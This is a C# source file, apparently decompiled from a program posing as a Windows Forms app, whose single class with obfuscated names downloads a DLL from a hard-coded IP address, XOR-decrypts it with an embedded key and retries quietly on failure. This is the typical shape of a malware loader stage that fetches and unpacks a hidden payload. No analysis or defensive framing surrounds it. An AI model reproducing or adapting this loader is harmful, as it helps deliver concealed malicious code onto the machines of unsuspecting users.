using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace WindowsFormsApp15;

internal class Trak
{
	private static byte[] Vysi(string url)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		WebResponse response = ((HttpWebRequest)WebRequest.Create(url)).GetResponse();
		MemoryStream memoryStream = new MemoryStream();
		response.GetResponseStream().CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	private static byte[] From()
	{
		return Vysi("http://194.4.48.151/1020/Bxerk.dll");
	}

	internal static byte[] Array()
	{
		for (int i = 0; i < 5; i++)
		{
			try
			{
				byte[] array = From();
				string s = "Xwgtnlpsggvnlggcndekkdl";
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				byte[] array2 = new byte[array.Length];
				for (int j = 0; j < array.Length; j++)
				{
					array2[j] = (byte)(bytes[j % bytes.Length] ^ array[j]);
				}
				return array2;
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(20.0));
			}
		}
		return null;
	}
}
